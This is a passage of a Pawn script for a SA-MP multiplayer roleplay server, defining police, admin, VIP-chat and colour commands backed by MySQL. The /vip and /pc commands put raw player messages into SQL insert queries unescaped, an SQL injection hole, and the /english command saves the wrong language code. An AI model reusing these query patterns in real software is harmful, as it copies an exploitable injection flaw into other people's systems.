	SCMF(playerid, -1, "-- MDC [ID %d - %s][{FFFF00}W:%d{FFFFFF}][Chased by %d cops][Wanted expires in %d mins]", targetId, GetName(targetId), PlayerInfo[targetId][pWantedLevel], s_PlayerInfo[targetId][pSCased], (GetPVarInt(targetId, "wanted_time") - gettime()) / 60);

    ShowPlayerMDC(targetId, playerid);

	return 1;
}

YCMD:su(playerid, params[], help)
{
	if(!IsACop(playerid))
		return SCM(playerid, -1, "You are not a cop.");

	if(!s_PlayerInfo[playerid][pSOnDuty])
		return SCM(playerid, -1, "You are not on duty.");

	new
		targetId, wLevel, wReason[64];

	if(sscanf(params, "uis[64]", targetId, wLevel, wReason))
		return sendSyntax(playerid, "/su [name/playerid] [level] [reason]");

	if(!IsPlayerConnected(targetId))
		return SCM(playerid, COLOR_WHITE, "Player not connected.");

	if(wLevel < 1 || wLevel > 7)
		return SCM(playerid, -1, "Invalid wanted level (1-6).");

	mysql_real_escape_string(wReason, wReason);

    return SetPlayerCriminal(targetId, playerid, wLevel, wReason);
}

YCMD:members(playerid, params[], help)
{
    if(!PlayerInfo[playerid][pMember])
        return SCM(playerid, -1, "Nu faci parte dintr-o factiune!");

    mysql_format(SQL, gString, sizeof gString, "select * from `users` where `Member` = '%d' order by `Rank` desc limit 20", PlayerInfo[playerid][pMember]);
    mysql_tquery(SQL, gString, "ShowFactionMembers", "d", playerid);
    return 1;
}
YCMD:fmembers(playerid, params[], help)
{
    
    if(PlayerInfo[playerid][pAdmin] >= 1)
    {
        new idd;
        if(sscanf(params, "i", idd)) return sendSyntax(playerid, "/fmembers [faction id]");
        new aim[5000],
            query[300],
            test[300],
            test1[300],
            test2[300],
            test3[300],
            test4,
            aimtotal[5000],
            result[300];
        format(query, sizeof(query), "SELECT * FROM `users` WHERE `users`.`Member` = '%d' ORDER BY `users`.`Rank` DESC LIMIT 50", idd);
        new Cache: membresult = mysql_query(SQL, query);
        for(new i, j = cache_get_row_count (); i != j; ++i)
        {
            cache_get_field_content(i, "name", result); format(test, 300, result);
            cache_get_field_content(i, "Rank", result); format(test1, 300, result);
            cache_get_field_content(i, "lastOn", result); format(test2, 300, result);
            cache_get_field_content(i, "FWarn", result); format(test3, 300, result);
            test4 = cache_get_field_content_int(i, "FactionJoin");
            new id = GetPlayerID(test);
            if(id != INVALID_PLAYER_ID)
            {
                format(aim, sizeof(aim), "%s%s - %s\tonline right now\t%s/3 fw\t%d days\n", aim, test1, test, test3, GetDaysFromTimestamp(test4));
            }
            else
            {
                format(aim, sizeof(aim), "%s%s - %s\t%s\t%s/3 fw\t%d days\n", aim, test1, test, test2, test3, GetDaysFromTimestamp(test4));
            }
        }
        cache_delete(membresult);
        format(aimtotal, sizeof(aimtotal), "Rank - Name\tLast Login\t\tFW\tDays\n%s",aim);
        Dialog_Show(playerid,FMembers,DIALOG_STYLE_TABLIST_HEADERS,"Faction members",aimtotal,"Exit","");
    }
    return 1; }
Dialog:FMembers(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    /*PlayerInfo[playerid][pColors] = 11 + listitem; 
    SCMF(playerid, -1, "%sSERVER >> {FFFFFF}Nick color changed! Hope you like the new color!", getChatColors(playerid));
    
    pUpdateInt(playerid, "Color", PlayerInfo[playerid][pColors]);*/
    return 1;
}
YCMD:wanted(playerid, params[], help)
{
	if(!IsACop(playerid))
		return SCM(playerid, -1, "You are not a cop.");

	if(!Iter_Count(WantedPlayers))
		return SCM(playerid, -1, "No active felons found.");

	new
		listId;
	
	gString = "Name\tWanted level\tTime left\tDistance\n";

	foreach(new i : WantedPlayers)
	{
		format(gString, sizeof gString, "%s%s\t%d\t%s\t%.0fm\n", gString, GetName(i), PlayerInfo[i][pWantedLevel], CalculeazaTimp2(GetPVarInt(i, "wanted_time") - gettime()), GetDistanceBetweenPlayers(playerid, i));
		s_PlayerInfo[playerid][pSDialogItems][listId] = i;

		listId ++;
	}
	Dialog_Show(playerid, DIALOG_WANTED, DIALOG_STYLE_TABLIST_HEADERS, "Server: Active Felons", gString, "Find", "Exit");
	return 1;
}

/*CMD:nearwanted(playerid, params[])
{
	if(!IsACop(playerid))
		return SCM(playerid, -1, "You are not a cop.");
	
	new
		iString[512],string[300],sendername[MAX_PLAYER_NAME],count = 0,online[50];

	foreach(new i : streamedPlayers[playerid])
	{
		if(!PlayerInfo[i][pWantedLevel])
			continue;

		dSelected[count][playerid] = i;
				if(PlayerInfo[i][pSleeping] > 0)
			{
				format(string, sizeof(string), "[W:%d] [%d] [%d] %s (AFK)\n",PlayerInfo[i][pWantedLevel],wantedlost[i]/60,cased[i],sendername);
				count++;
			}
			else if(PlayerInfo[i][pSleeping] == 0)
				{
				format(string, sizeof(string), "[W:%d] [%d] [%d] %s\n",PlayerInfo[i][pWantedLevel],wantedlost[i]/60,cased[i],sendername);
				count++;
			}
			strcat(iString, string);
		}
		}
	}
	format(online, sizeof(online),"Wanted online: %d",count);
	if(count == 0) return SCM(playerid,COLOR_WHITE,"{FFB870}No wanted neat you at the moment.");
	ShowPlayerDialog(playerid, DIALOG_WANTEDON, DIALOG_STYLE_LIST, online, iString , "Select", "Close");
	return 1;
}*/

YCMD:arrest(playerid, params[], help)
{
    if(!IsACop(playerid))
        return SCM(playerid, COLOR_GREY, "You are not a cop.");

    if(!s_PlayerInfo[playerid][pSOnDuty])
        return SCM(playerid, COLOR_GREY, "You are not on duty.");

    new
        targetId;
    
    if(sscanf(params, "u", targetId))
        return sendSyntax(playerid, "/arrest [name/playerid]");

    if(!IsPlayerConnected(targetId))
        return SCM(playerid, COLOR_GREY, "Player not connected.");

    if(GetDistanceBetweenPlayers(playerid, targetId) > 5)
        return SCM(playerid, COLOR_GREY, "This player is not near you.");

    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && IsACopCar(GetPlayerVehicleID(playerid)) && GetPlayerVehicleID(playerid) == GetPlayerVehicleID(playerid) && IsPlayerInRangeOfPoint(playerid, 10.0, 1526.2357, -1678.0305, 5.8906) || IsPlayerInRangeOfPoint(playerid, 6.0, 268.9264, 81.9687, 1001.0391) || IsPlayerInRangeOfPoint(playerid, 4.0, 2282.1289, 2425.7620, 3.4692))
    {
        if(PlayerInfo[targetId][pWantedLevel] < 1)
            return SCM(playerid, COLOR_GREY, "This player don't have wanted.");

        // update raport
        DailyQuestCheck(playerid, QUEST_TYPE_COPS, 1);

        new
            fine = PlayerInfo[targetId][pWantedLevel] * 100000, time = PlayerInfo[targetId][pWantedLevel] * 150;

        GivePlayerCash(targetId, -fine);
        DynamicFactions[PlayerInfo[playerid][pMember]][fBank] += fine;

        mysql_format(SQL, gString, sizeof gString, "update `factions` set `Bank` = '%d' where `ID` = '%d'", DynamicFactions[PlayerInfo[playerid][pMember]][fBank], PlayerInfo[playerid][pMember]);
        mysql_tquery(SQL, gString, "", "");

        ResetPlayerWeaponsEx(targetId);

        SetPlayerWantedLevel(targetId, 0);
        SetPlayerInterior(targetId, 6);

        SCMF(playerid, COLOR_LIGHTBLUE, "You have been arrested by %s for %d seconds, and issued a fine of $%s.", GetName(playerid), time, FormatNumber(fine));

        PlayerInfo[targetId][pJailed] = 1;
        PlayerInfo[targetId][pArrested] += 1;
        PlayerInfo[targetId][pJailTime] = time;
        PlayerInfo[targetId][pWantedLevel] = 0;
    }
    return 1;
}

YCMD:mute(playerid, params[], help)
{
    
    if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 2)
    {
        new time,id,reason[64];
        if(sscanf(params, "uis[128]",id,time,reason)) return sendSyntax(playerid, "/mute [name/playerid] [minutes] [reason]");
        if(IsPlayerConnected(id))
        {
            PlayerInfo[id][pMuteTime] = time*60;

            SCMF(id, COLOR_LIGHTRED, "* You were muted by Admin %s for %d minutes, reason: %s.", GetName(playerid), time, reason);

            format(gString, sizeof(gString), "AdmCMD: %s has been muted by %s for %d minutes, reason: %s.", GetName(id), GetName(playerid), time, reason);
            SendClientMessageToAll(COLOR_LIGHTRED, gString);

            mysql_format(SQL, gString, sizeof gString, "update users set `MuteTime` = '%d' WHERE `name` = '%s'", PlayerInfo[id][pMuteTime], PlayerInfo[id][pNormalName]);
            mysql_tquery(SQL, gString, "","");

            mysql_real_escape_string(reason, reason);
            mysql_format(SQL, gString, sizeof(gString), "insert into punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`reason`,`playername`,`givername`,`unixtime`) values ('%d','%d','7','%d','%s','%s','%s','%d')", PlayerInfo[id][pSQLID], PlayerInfo[playerid][pSQLID], time, reason, PlayerInfo[playerid][pNormalName], PlayerInfo[id][pNormalName],gettime());
            mysql_tquery(SQL, gString, "", "");
            
            AdminLog(playerid, "[cmd:mute-log] Admin %s (userId: %d) muted %s (userId: %d) for %d minutes.", PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID], PlayerInfo[id][pNormalName], PlayerInfo[id][pSQLID], time);
        }
        else
        {
            SendClientMessage(playerid, COLOR_GREY, "Player not connected.");
        }
    }
    else return SendClientMessage(playerid, COLOR_RED2, AdminOnly);
    return 1;
}

YCMD:colors(playerid, params[], help) {
    new
        colorString[2048 + 1024 + 64]; // muie samp

    format(colorString, sizeof colorString, "{FFFFFF}Normal colors:\n");
    format(colorString, sizeof colorString, "%s{000000}000 {F5F5F5}001 {2A77A1}002 {840410}003 {263739}004 {86446E}005 {D78E10}006 {4C75B7}007 {BDBEC6}008 {5E7072}009 {46597A}010 {656A79}011 {5D7E8D}012 {58595A}013 {D6DAD6}014 {9CA1A3}015 {335F3F}016 {730E1A}017 {7B0A2A}018 {9F9D94}019\n", colorString);
    format(colorString, sizeof colorString, "%s{3B4E78}020 {732E3E}021 {691E3B}022 {96918C}023 {515459}024 {3F3E45}025 {A5A9A7}026 {635C5A}027 {3D4A68}028 {979592}029 {421F21}030 {5F272B}031 {8494AB}032 {767B7C}033 {646464}034 {5A5752}035 {252527}036 {2D3A35}037 {93A396}038 {6D7A88}039\n", colorString);
    format(colorString, sizeof colorString, "%s{221918}040 {6F675F}041 {7C1C2A}042 {5F0A15}043 {193826}044 {5D1B20}045 {9D9872}046 {7A7560}047 {989586}048 {ADB0B0}049 {848988}050 {304F45}051 {4D6268}052 {162248}053 {272F4B}054 {7D6256}055 {9EA4AB}056 {9C8D71}057 {6D1822}058 {4E6881}059\n", colorString);
    format(colorString, sizeof colorString, "%s{9C9C98}060 {917347}061 {661C26}062 {949D9F}063 {A4A7A5}064 {8E8C46}065 {341A1E}066 {6A7A8C}067 {AAAD8E}068 {AB988F}069 {851F2E}070 {6F8297}071 {585853}072 {9AA790}073 {601A23}074 {20202C}075 {A4A096}076 {AA9D84}077 {78222B}078 {0E316D}079\n", colorString);
    format(colorString, sizeof colorString, "%s{722A3F}080 {7B715E}081 {741D28}082 {1E2E32}083 {4D322F}084 {7C1B44}085 {2E5B20}086 {395A83}087 {6D2837}088 {A7A28F}089 {AFB1B1}090 {364155}091 {6D6C6E}092 {0F6A89}093 {204B6B}094 {2B3E57}095 {9B9F9D}096 {6C8495}097 {4D8495}098 {AE9B7F}099\n", colorString);
    format(colorString, sizeof colorString, "%s{406C8F}100 {1F253B}101 {AB9276}102 {134573}103 {96816C}104 {64686A}105 {105082}106 {A19983}107 {385694}108 {525661}109 {7F6956}110 {8C929A}111 {596E87}112 {473532}113 {44624F}114 {730A27}115 {223457}116 {640D1B}117 {A3ADC6}118 {695853}119\n", colorString);
    format(colorString, sizeof colorString, "%s{9B8B80}120 {620B1C}121 {5B5D5E}122 {624428}123 {731827}124 {1B376D}125 {EC6AAE}126 {000000}127\n", colorString);
    format(colorString, sizeof colorString, "%s{FFFFFF}Hidden colors:\n", colorString);
    format(colorString, sizeof colorString, "%s{177517}128 {210606}129 {125478}130 {452A0D}131 {571E1E}132 {010701}133 {25225A}134 {2C89AA}135 {8A4DBD}136 {35963A}137 {B7B7B7}138 {464C8D}139 {84888C}140 {817867}141 {817A26}142 {6A506F}143 {583E6F}144 {8CB972}145 {824F78}146 {6D276A}147\n", colorString);
    format(colorString, sizeof colorString, "%s{1E1D13}148 {1E1306}149 {1F2518}150 {2C4531}151 {1E4C99}152 {2E5F43}153 {1E9948}154 {1E9999}155 {999976}156 {7C8499}157 {992E1E}158 {2C1E08}159 {142407}160 {993E4D}161 {1E4C99}162 {198181}163 {1A292A}164 {16616F}165 {1B6687}166 {6C3F99}167\n", colorString);
    format(colorString, sizeof colorString, "%s{481A0E}168 {7A7399}169 {746D99}170 {53387E}171 {222407}172 {3E190C}173 {46210E}174 {991E1E}175 {8D4C8D}176 {805B80}177 {7B3E7E}178 {3C1737}179 {733517}180 {781818}181 {83341A}182 {8E2F1C}183 {7E3E53}184 {7C6D7C}185 {020C02}186 {072407}187\n", colorString);
    format(colorString, sizeof colorString, "%s{163012}188 {16301B}189 {642B4F}190 {368452}191 {999590}192 {818D96}193 {99991E}194 {7F994C}195 {839292}196 {788222}197 {2B3C99}198 {3A3A0B}199 {8A794E}200 {0E1F49}201 {15371C}202 {15273A}203 {375775}204 {060820}205 {071326}206 {20394B}207\n", colorString);
    format(colorString, sizeof colorString, "%s{2C5089}208 {15426C}209 {103250}210 {241663}211 {692015}212 {8C8D94}213 {516013}214 {090F02}215 {8C573A}216 {52888E}217 {995C52}218 {99581E}219 {993A63}220 {998F4E}221 {99311E}222 {0D1842}223 {521E1E}224 {42420D}225 {4C991E}226 {082A1D}227\n", colorString);
    format(colorString, sizeof colorString, "%s{96821D}228 {197F19}229 {3B141F}230 {745217}231 {893F8D}232 {7E1A6C}233 {0B370B}234 {27450D}235 {071F24}236 {784573}237 {8A653A}238 {732617}239 {319490}240 {56941D}241 {59163D}242 {1B8A2F}243 {38160B}244 {041804}245 {355D8E}246 {2E3F5B}247\n", colorString);
    format(colorString, sizeof colorString, "%s{561A28}248 {4E0E27}249 {706C67}250 {3B3E42}251 {2E2D33}252 {7B7E7D}253 {4A4442}254 {28344E}255\n", colorString);

    Dialog_Show(playerid, DIALOG_0, DIALOG_STYLE_MSGBOX, "Vehicle Hidden Colors", colorString, "Close","");
    return 1; }

YCMD:muteo(playerid, params[], help)
{
    if(GetPVarInt(playerid, "delay_actions") > gettime()) 
        return SCMF(playerid, -1, "Asteapta %d secunde pentru a folosi din nou aceasta comanda.", GetPVarInt(playerid, "delay_actions") - gettime());

    if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_RED2, AdminOnly);
    new id[30],escape[30],cont,msg[80],msge[80],time, dbID;
    if(sscanf(params, "s[25]is[80]", id,time,msg)) return sendSyntax(playerid, "/muteo [name] [minutes] [reason]");
    mysql_real_escape_string(id, escape);
    cont = checkAccountFromDatabase(escape);
    if(cont == 0) return SendClientMessage(playerid, -1, "Invalid player.");
    if(time <= 0) return SendClientMessage(playerid, -1, "Invalid mute time.");
    mysql_real_escape_string(msg, msge);
    new sendername[25],string[184];
    GetPlayerName(playerid,sendername,sizeof(sendername));
    format(string, sizeof(string), "Offline: %s was muted by %s for %d minutes, reason: %s", escape, sendername,time,msge);
    SendClientMessageToAll(COLOR_LIGHTRED, string);
    new timem = time*60,
        str1[168];
    mysql_format(SQL,str1,sizeof(str1),"update users set `Muted` = '1', `MuteTime` = '%d' WHERE `name` = '%s'",timem,escape);
    mysql_tquery(SQL,str1,"","");
    format(str1, sizeof(str1), "SELECT `id` FROM users WHERE `name` = '%s'", escape);
    new Cache: ab = mysql_query(SQL,str1);
    if(cache_get_row_count() > 0)
    {
        dbID = cache_get_field_content_int(0, "id");
    }
    cache_delete(ab);
    
    gString[0] = EOS;
    mysql_format(SQL, gString, sizeof gString, "insert into punishlogs (`playerid`, `giverid`, `actionid`, `actiontime`,`reason`,`playername`,`givername`,`unixtime`) values ('%d','%d','7','%d','%s','%s','%s','%d')", dbID,PlayerInfo[playerid][pSQLID],time,msge,escape,sendername,gettime());
    mysql_tquery(SQL, gString, "", "");

    insertPlayerMail(dbID, gettime(), "Ai primit mute de la adminul %s pentru %d minute, motiv: %s.",sendername, time, msge);

    SetPVarInt(playerid, "delay_actions", gettime() + 10);
    return 1; }

YCMD:togvip(playerid, params[], help)
{
    if(PlayerInfo[playerid][pVIPAccount] < 1 && PlayerInfo[playerid][pAdmin] < 1)
        return sendAcces(playerid);

    switch(TogVIP[playerid])
    {
        case 0: 
            SCM(playerid, COLOR_GREY, "Chat-ul Premium a fost activat."), TogVIP[playerid] = 1;
        case 1:
            SCM(playerid, COLOR_GREY, "Chat-ul Premium a fost dezactivat."), TogVIP[playerid] = 0;
    }
    return 1; 
}

YCMD:vip(playerid, params[], help)
{
    if(PlayerInfo[playerid][pMuted] == 1)
        return SCMF(playerid, -1, "You can not talk. You are muted for %s (%d seconds).", CalculeazaTimp2(PlayerInfo[playerid][pMuteTime]), PlayerInfo[playerid][pMuteTime]);

    if(GetPVarInt(playerid, "delay_vip") > gettime()) 
        return sendError(playerid, "Asteapta %d secunde pentru a folosi din nou aceasta comanda.", GetPVarInt(playerid, "delay_vip") - gettime());

    if(PlayerInfo[playerid][pVIPAccount] < 1 && PlayerInfo[playerid][pAdmin] < 1)
        return sendAcces(playerid);
    
    if(TogVIP[playerid] == 0) 
        return sendError(playerid, "Chat VIP dezactivat. Foloseste /togvip pentru a-l activa.");

    new 
        messageString[128];
    
    if(sscanf(params, "s[128]", messageString)) 
        return sendSyntax(playerid, "/vip <Message>");
    
    foreach(new i : Vips)
        if(Iter_Contains(Vips, i) && !Iter_Contains(Admins, i) && TogPremium[i] == 1)
            SCMF(i, COLOR_LIGHTRED, "[VIP-CHAT] >> {bf891d}%s %s (%d): %s", Iter_Contains(Admins, playerid) ? ("Admin") : Iter_Contains(Vips, playerid) ? ("VIP") : (""), GetName(playerid), playerid, messageString);

    foreach(new i : Admins)
        if(Iter_Contains(Admins, i) && TogVIP[i] == 1) 
            SCMF(i, COLOR_LIGHTRED, "[VIP-CHAT] >> {bf891d}%s %s (%d): %s", Iter_Contains(Admins, playerid) ? ("Admin") : Iter_Contains(Vips, playerid) ? ("VIP") : (""), GetName(playerid), playerid, messageString);
    
    gString[0] = EOS;
    mysql_format(SQL, gString, sizeof gString, "insert into chat_logs (`playerid`, `text`, `where`) values ('%d', 'VIP %s: %s', 'vip')", PlayerInfo[playerid][pSQLID], GetName(playerid), messageString);
    mysql_tquery(SQL, gString, "", "");

    SetPVarInt(playerid, "delay_vip", gettime() + 10);

    return 1; 
}

YCMD:togpremium(playerid, params[], help)
{
    if(PlayerInfo[playerid][pVIPAccount] < 1 && PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pPremiumAccount] < 1)
        return sendAcces(playerid);

    switch(TogPremium[playerid])
    {
        case 0: 
            SCM(playerid, COLOR_GREY, "Chat-ul Premium a fost activat."), TogPremium[playerid] = 1;
        case 1:
            SCM(playerid, COLOR_GREY, "Chat-ul Premium a fost dezactivat."), TogPremium[playerid] = 0;
    }
    return 1; 
}

YCMD:pc(playerid, params[], help)
{
    if(PlayerInfo[playerid][pMuted] == 1)
        return SCMF(playerid, -1, "You can not talk. You are muted for %s (%d seconds).", CalculeazaTimp2(PlayerInfo[playerid][pMuteTime]), PlayerInfo[playerid][pMuteTime]);

    if(GetPVarInt(playerid, "delay_pc") > gettime()) 
        return sendError(playerid, "Asteapta %d secunde pentru a folosi din nou aceasta comanda.", GetPVarInt(playerid, "delay_pc") - gettime());

    if(PlayerInfo[playerid][pVIPAccount] < 1 && PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pPremiumAccount] < 1)
        return sendAcces(playerid);
    
    if(TogPremium[playerid] == 0) 
        return sendError(playerid, "Chat VIP dezactivat. Foloseste /togpremium pentru a-l activa.");

    new 
        messageString[128];
    
    if(sscanf(params, "s[128]", messageString)) 
        return sendSyntax(playerid, "/pc <Message>");
    
    foreach(new i : Player)
    {
        if(Iter_Contains(Premiums, i) && !Iter_Contains(Admins, i) && TogPremium[i] == 1)
            SCMF(i, COLOR_TEAL, "[PREMIUM-CHAT] >> {bf891d}%s %s (%d): %s", Iter_Contains(Admins, playerid) ? ("Admin") : Iter_Contains(Vips, playerid) ? ("VIP") : Iter_Contains(Premiums, playerid) ? ("Premium") : (""), GetName(playerid), playerid, messageString);
    }

    foreach(new i : Admins)
    {
        if(Iter_Contains(Admins, i) && TogVIP[i] == 1) 
            SCMF(i, COLOR_TEAL, "[PREMIUM-CHAT] >> {bf891d}%s %s (%d): %s", Iter_Contains(Admins, playerid) ? ("Admin") : Iter_Contains(Vips, playerid) ? ("VIP") : Iter_Contains(Premiums, playerid) ? ("Premium") : (""), GetName(playerid), playerid, messageString);
    }

    gString[0] = EOS;
    mysql_format(SQL, gString, sizeof gString, "insert into chat_logs (`playerid`, `text`, `where`) values ('%d', 'Premium %s: %s', 'premium')", PlayerInfo[playerid][pSQLID], GetName(playerid), messageString);
    mysql_tquery(SQL, gString, "", "");

    SetPVarInt(playerid, "delay_pc", gettime() + 10);

    return 1; 
}

YCMD:vipcolors(playerid, params[], help)
{   
    if(PlayerInfo[playerid][pVIPAccount] < 1 && PlayerInfo[playerid][pPremiumAccount] < 1)
        return sendError(playerid, "Nu ai cont VIP");

    Dialog_Show(playerid, ColorsVip, DIALOG_STYLE_LIST, "Vip Colors:", "{990000}Color 1\n{ff3333}Color 2\n{e60000}Color 3", "Choose", "Cancel");
    return 1; 
}
Dialog:ColorsVip(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    PlayerInfo[playerid][pColors] = 11 + listitem; 
    SCMF(playerid, -1, "%sSERVER >> {FFFFFF}Nick color changed! Hope you like the new color!", getChatColors(playerid));
    
    pUpdateInt(playerid, "Color", PlayerInfo[playerid][pColors]);
    return 1;
}
YCMD:romana(playerid, params[], help)
{
    PlayerInfo[playerid][pLanguage] = 2;
   
    SCM(playerid, COLOR_WHITE, "Limba setata: romana.");
    SCM(playerid, COLOR_WHITE, "[EN] To set the language to English, use /en.");

    gString[0] = EOS;
    mysql_format(SQL, gString, sizeof gString, "update users set `Language` = '2' where `name` = '%s'", PlayerInfo[playerid][pNormalName]);
    mysql_tquery(SQL, gString, "", "");
    return 1;
}

YCMD:english(playerid, params[], help)
{
    PlayerInfo[playerid][pLanguage] = 1;

    SendClientMessage(playerid, COLOR_WHITE, "Language set to english.");
    SendClientMessage(playerid, COLOR_WHITE, "[RO] Pentru a seta limba romana foloseste /ro.");

    gString[0] = EOS;
    mysql_format(SQL, gString, sizeof gString, "update users set `Language` = '2' where `name` = '%s'", PlayerInfo[playerid][pNormalName]);
    mysql_tquery(SQL, gString, "", "");
    return 1;
}

YCMD:rmute(playerid, params[], help)
{
    
    if(PlayerInfo[playerid][pAdmin] >= 1)
    {
        new id,time;
        if(sscanf(params, "ud", id, time)) return sendSyntax(playerid, "/rmute [name/playerid] [minutes]");
        if(time < 1 || time > 120) return SendClientMessage(playerid, -1, "You can mute a player minimum 1 minute and maximum 120 minutes.");

        format(gString, sizeof gString, "AdmCMD: %s a primit kick si mute pe /report de la %s pentru %d minute.", GetName(id), GetName(playerid), time);
        SendClientMessageToAll(COLOR_LIGHTRED, gString);
        
        PlayerInfo[id][pReportMuted] = time;
        pUpdateInt(id, "ReportMuted", PlayerInfo[id][pReportMuted]);
        KickEx(id);
    }
    else return SendClientMessage(playerid, COLOR_RED2, AdminOnly);
    return 1;
}

YCMD:gunname(playerid, params[], help) 
{
    
    if(PlayerInfo[playerid][pAdmin] >= 1)
    {
        SendClientMessage(playerid, COLOR_TEAL, "--------------------------------------------------------------------------------------------------------------------------------");
        SendClientMessage(playerid, COLOR_WHITE, "Weapon Search:");
        new
            rcount;

        if(isnull(params)) return SendClientMessage(playerid, -1, "No keyword specified.");
        if(strlen(params) < 3) return SendClientMessage(playerid,-1, "Search keyword too short.");

        for(new v; v < 47; v++) {
            if(strfind(GunNames[v], params, true) != -1) {

                if(rcount == 0) format(gString, sizeof(gString), "%s (ID %d)", GunNames[v], v);
                else format(gString, sizeof(gString), "%s | %s (ID %d)", gString, GunNames[v], v);

                rcount++;
            }
        }

        if(rcount == 0) SendClientMessage(playerid, -1, "No results found.");

        else if(strlen(gString) >= 128) SendClientMessage(playerid, -1, "Too many results found.");

        else return SendClientMessage(playerid, COLOR_WHITE, gString);

        SendClientMessage(playerid, COLOR_TEAL, "--------------------------------------------------------------------------------------------------------------------------------");
    }
    else return SendClientMessage(playerid, COLOR_RED2, AdminOnly);
    return 1; }

YCMD:togfind(playerid, params[], help)
{
    if(PlayerInfo[playerid][pAdmin] < 6) 
        return sendAcces(playerid);

    if(!s_PlayerInfo[playerid][pSTogFind])
        s_PlayerInfo[playerid][pSTogFind] = 1, SCM(playerid, COLOR_WHITE, "Now players can't find you.");
    else
        s_PlayerInfo[playerid][pSTogFind] = 0, SCM(playerid, COLOR_WHITE, "Now players can find you.");
    
    return 1;
}

YCMD:specme(playerid, params[], help)
{
    
    if(PlayerInfo[playerid][pAdmin] >= 4)
    {
        if(!s_PlayerInfo[playerid][pSCanSpec])
        {
            s_PlayerInfo[playerid][pSCanSpec] = 1;
            SS(playerid, COLOR_RED, "Adminii pot da acum spectate si /goto la tine.","Admins can spectate you an teleport.");
        }
        else
        {
            s_PlayerInfo[playerid][pSCanSpec] = 0;
            SS(playerid, COLOR_RED, "Adminii nu mai pot da acum spectate si /goto la tine.","Admins can't teleport an specate you.");
        }
    }
    else return SendClientMessage(playerid, COLOR_RED2, AdminOnly);
    return 1; }
YCMD:gethere(playerid, params[], help)
{
    
    if(PlayerInfo[playerid][pAdmin] >= 1)
    {
        new targetId,sendername[30],giveplayer[30],string[256];
        if(sscanf(params, "u",targetId)) return sendSyntax(playerid, "/gethere [name/playerid]");
        new Float:targetIdcx,Float:targetIdcy,Float:targetIdcz;

        if(targetId == playerid)
            return sendError(playerid, "This command cannot be used on you.");

        if(IsPlayerConnected(targetId))
        {
            if(targetId != INVALID_PLAYER_ID)
            {
                if(s_PlayerInfo[targetId][pSCanSpec] == 0 && PlayerInfo[playerid][pAdmin] < 6)
                    return SendClientMessage(playerid, -1, "You don't have permission to use /gethere on this admin.");
                
                GetPlayerPos(playerid, targetIdcx, targetIdcy, targetIdcz);
                SetPlayerInterior(targetId, GetPlayerInterior(playerid));
                
                if(GetPlayerState(targetId) == 2)
                    SetVehiclePos(GetPlayerVehicleID(targetId), targetIdcx, targetIdcy+4, targetIdcz);
                else
                    SetPlayerPosEx(targetId,targetIdcx,targetIdcy+2, targetIdcz);

                if(s_PlayerInfo[playerid][pSInHouse])
                {
                    s_PlayerInfo[targetId][pSInHouse] = s_PlayerInfo[playerid][pSInHouse];

                    if(HouseInfo[s_PlayerInfo[playerid][pSInHouse]][hRadio])
                    {
                        StopAudioStreamForPlayer(playerid);
                        PlayAudioStreamForPlayer(playerid, RadioLinks[HouseInfo[s_PlayerInfo[playerid][pSInHouse]][hRadio]]);
                    }
                }
                if(s_PlayerInfo[playerid][pSInHQ] > 0)
                {
                    s_PlayerInfo[targetId][pSInHQ] = s_PlayerInfo[playerid][pSInHQ];
                }
                if(s_PlayerInfo[playerid][pSInBusiness] > 0)
                {
                    s_PlayerInfo[targetId][pSInBusiness] = s_PlayerInfo[playerid][pSInBusiness];
                }
                SetPlayerVirtualWorld(targetId, GetPlayerVirtualWorld(playerid));
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GetPlayerName(targetId, giveplayer, sizeof(giveplayer));
                format(string,sizeof(string),"You have teleported %s to you.",giveplayer);
                
                SCMF(playerid, COLOR_GRAD1, "You have teleported %s to you.", GetName(targetId));
                SCMF(targetId, COLOR_GRAD1, "You have been teleported by admin %s.", GetName(playerid));
                
                s_PlayerInfo[playerid][pSInHQ] = 0;
                s_PlayerInfo[playerid][pSInHouse] = 0;
                s_PlayerInfo[playerid][pSInBusiness] = 0;
            }
        }
        else return SendClientMessage(playerid,COLOR_WHITE, "Player not connected.");
    }
    else return SendClientMessage(playerid, COLOR_RED2, AdminOnly);
    return 1; }

YCMD:pet(playerid, params[], help)
{
    if(PlayerInfo[playerid][pPet] == 0) 
        return SCM(playerid, COLOR_RED, "[ERROR]: {FFFFFF}Nu detii un animal de companie.");

    format(gString, sizeof gString, "Option\tValue\nStatus\t%s\nNume pet\t{26B309}%s\nBeneficii pet\nAvanseaza pet\t%d/%d pet points\nTip pet", (PlayerInfo[playerid][pPetStatus] != 0 ? ("{1AAB07}Mounted") : ("{ff0000}Sleeping")), PlayerInfo[playerid][pPetName], PlayerInfo[playerid][pPetPoints], PlayerInfo[playerid][pPetLevel] * 100);
    Dialog_Show(playerid, DIALOG_PET, DIALOG_STYLE_TABLIST_HEADERS, "Pet Menu", gString, "Select", "Exit");
    return 1; 
}

YCMD:set(playerid, params[], help)
{
    if(PlayerInfo[playerid][pAdmin] < 3) 
        return SCM(playerid, COLOR_RED2, AdminOnly);

    new id, item[20], amount;

    if(sscanf(params, "us[20]d", id, item, amount)) {
        sendSyntax(playerid, "/set <playerid> <option> <value>");
        SendSplitMessage(playerid, COLOR_GREY, "Available options: hp, armour, money, crystals");
        return 1;
    }
    if(!IsPlayerConnected(id))
        return sendError(playerid, "Invalid or unlogged player.");

    if(strcmp(item,"hp",true) == 0)
    {
        SetPlayerHealthEx(id, amount);
        ABroadCast(COLOR_RED, 1, "[/set] Admin %s [user: %d] updated %s [user: %d] health to %d.", PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID], PlayerInfo[id][pNormalName], PlayerInfo[id][pSQLID], amount);
        AdminLog(playerid, "[cmd:set-log] Admin %s (userId: %d) updated %s (userId: %d) health to %d.", PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID], PlayerInfo[id][pNormalName], PlayerInfo[id][pSQLID], amount);
    }
    else if(strcmp(item,"armour",true) == 0)
    {
